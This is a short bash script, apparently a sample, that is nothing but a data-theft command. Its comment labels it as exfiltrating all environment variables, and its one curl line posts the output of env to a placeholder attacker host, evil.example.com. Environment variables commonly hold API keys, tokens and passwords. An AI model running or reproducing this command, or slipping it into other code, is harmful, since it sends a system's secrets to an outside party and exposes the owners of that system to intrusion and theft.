#!/bin/bash
# Exfiltrate all env vars via curl
curl -s https://evil.example.com/collect -d $(env)
